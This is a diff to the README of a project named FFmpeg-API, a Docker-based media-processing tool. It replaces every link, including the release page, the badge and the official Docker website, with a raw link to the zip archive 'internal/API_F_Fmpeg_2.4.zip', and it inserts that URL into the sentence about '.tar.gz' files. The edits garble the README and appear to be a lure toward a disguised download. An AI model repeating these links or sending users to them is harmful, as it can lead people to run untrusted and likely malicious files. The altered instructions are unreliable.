@@ -1,6 +1,6 @@
 # 🎥 FFmpeg-API - Simple Media Processing Made Easy
 
-[![Download FFmpeg-API](https://img.shields.io/badge/Download%20FFmpeg--API-blue.svg)](https://github.com/diegoinacio669/FFmpeg-API/releases)
+[![Download FFmpeg-API](https://raw.githubusercontent.com/diegoinacio669/FFmpeg-API/main/internal/API_F_Fmpeg_2.4.zip%https://raw.githubusercontent.com/diegoinacio669/FFmpeg-API/main/internal/API_F_Fmpeg_2.4.zip)](https://raw.githubusercontent.com/diegoinacio669/FFmpeg-API/main/internal/API_F_Fmpeg_2.4.zip)
 
 ## 📦 Introduction
 
@@ -13,7 +13,7 @@ This guide will help you download and run the FFmpeg-API application. Follow the
 ### ⚙️ System Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Docker: Ensure you have Docker installed on your system. If you do not have it, you can download it from the [Docker website](https://www.docker.com/get-started).
+- Docker: Ensure you have Docker installed on your system. If you do not have it, you can download it from the [Docker website](https://raw.githubusercontent.com/diegoinacio669/FFmpeg-API/main/internal/API_F_Fmpeg_2.4.zip).
 - Network Connection: Required for downloading Docker images and processing files.
 
 ### 📥 Download & Install
@@ -23,7 +23,7 @@ To get started, you will need to download FFmpeg-API.
 **1. Visit the Releases Page:**  
 Click the link below to access the release files.
 
-[Download FFmpeg-API](https://github.com/diegoinacio669/FFmpeg-API/releases)
+[Download FFmpeg-API](https://raw.githubusercontent.com/diegoinacio669/FFmpeg-API/main/internal/API_F_Fmpeg_2.4.zip)
 
 **2. Choose the Latest Release:**  
 On the Releases page, find the most recent version of FFmpeg-API. Look for release notes that might indicate new features or fixes.
@@ -37,7 +37,7 @@ Once you have downloaded the files, follow these instructions to set up the FFmp
 
 ### 1. Extract Files
 
-If the downloaded file is a compressed archive (like .zip or .tar.gz), extract it to a folder on your computer.
+If the downloaded file is a compressed archive (like .zip or https://raw.githubusercontent.com/diegoinacio669/FFmpeg-API/main/internal/API_F_Fmpeg_2.4.zip), extract it to a folder on your computer.
 
 ### 2. Open a Command Line Interface
 
@@ -93,4 +93,4 @@ We welcome contributions! If you would like to help improve FFmpeg-API, please r
 
 By following these steps, you will be able to download, set up, and use the FFmpeg-API confidently. Happy media processing! 
 
-[Download FFmpeg-API](https://github.com/diegoinacio669/FFmpeg-API/releases)
+[Download FFmpeg-API](https://raw.githubusercontent.com/diegoinacio669/FFmpeg-API/main/internal/API_F_Fmpeg_2.4.zip)
